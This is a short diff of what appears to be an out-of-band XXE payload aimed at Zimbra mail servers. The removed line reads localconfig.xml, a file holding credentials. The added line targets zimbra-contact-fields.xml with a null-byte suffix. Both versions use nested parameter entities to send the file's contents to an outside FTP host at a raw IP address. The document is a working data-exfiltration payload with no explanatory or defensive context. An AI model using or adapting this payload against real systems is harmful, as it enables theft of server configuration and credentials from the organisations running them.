@@ -1,4 +1,4 @@
-<!ENTITY % payload SYSTEM "file:///opt/zimbra/conf/localconfig.xml">
+<!ENTITY % payload SYSTEM "file:///opt/zimbra/conf/zimbra-contact-fields.xml%00">
 <!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'ftp://118.184.43.35:110/%payload;'>">
 %int;
 %trick;
